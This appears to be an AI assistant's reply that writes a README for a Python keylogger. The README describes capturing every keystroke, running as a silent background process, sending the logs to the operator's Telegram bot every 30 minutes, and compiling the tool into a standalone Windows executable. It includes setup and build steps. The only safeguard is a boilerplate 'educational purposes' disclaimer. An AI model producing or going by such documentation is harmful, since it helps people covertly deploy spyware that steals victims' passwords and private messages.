Here's a sample `README.md` for your keylogger program:

```markdown
# Keylogger with Telegram Bot Integration

This Python program functions as a keylogger, capturing keystrokes from the system and sending the captured data to your Telegram bot at a set interval (default: every 30 minutes). The program can be compiled into an executable (.exe) and runs in the background.

## Features

- Captures all keystrokes from the system.
- Sends captured data to a specified Telegram bot at regular intervals (default: 30 minutes).
- Runs in the background as a silent process.
- Can be compiled into a standalone executable (.exe) for Windows.

## Installation

### Prerequisites

1. Python 3.x
2. The following Python libraries:
   - `pynput`
   - `requests`
   
   You can install them using pip:

   ```bash
   pip install pynput requests
   ```

3. A Telegram bot token. Create a bot using [BotFather](https://core.telegram.org/bots#botfather) and get the token.

4. Your Telegram chat ID where the logs will be sent. You can get the chat ID by sending a message to your bot and using the [GetUpdates method](https://core.telegram.org/bots/api#getupdates) from the Telegram API to find the chat ID.

### Setup

1. Clone the repository or download the script files to your local machine.

2. Edit the `config.py` file and set the following variables:

   - `TELEGRAM_BOT_TOKEN`: Your Telegram bot token.
   - `TELEGRAM_CHAT_ID`: Your Telegram chat ID.

   Example:

   ```python
   TELEGRAM_BOT_TOKEN = 'your-bot-token'
   TELEGRAM_CHAT_ID = 'your-chat-id'
   ```

3. You can adjust the interval at which logs are sent by modifying the `INTERVAL` variable (default: 30 minutes).

### Running the Script

To run the script, execute the following command:

```bash
python keylogger.py
```

Once the script is running, it will capture keystrokes and send the data to your Telegram bot at the specified intervals.

### Compiling to .exe (Windows)

If you want to compile the script into an executable file for Windows, you can use **PyInstaller**.

1. Install PyInstaller:

   ```bash
   pip install pyinstaller
   ```

2. Compile the script:

   ```bash
   pyinstaller --onefile keylogger.py
   ```

   This will create a single executable file in the `dist` folder. You can then run this file without needing Python installed.

## Disclaimer

**Important:** This keylogger is for educational purposes only. Unauthorized use of keyloggers may be illegal and unethical. Ensure that you have proper consent before using or distributing this software.

The author is not responsible for any misuse of this program.

## License

This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
```

You can customize this file further depending on additional details specific to your project. Make sure to emphasize the ethical considerations and the importance of using this software responsibly.
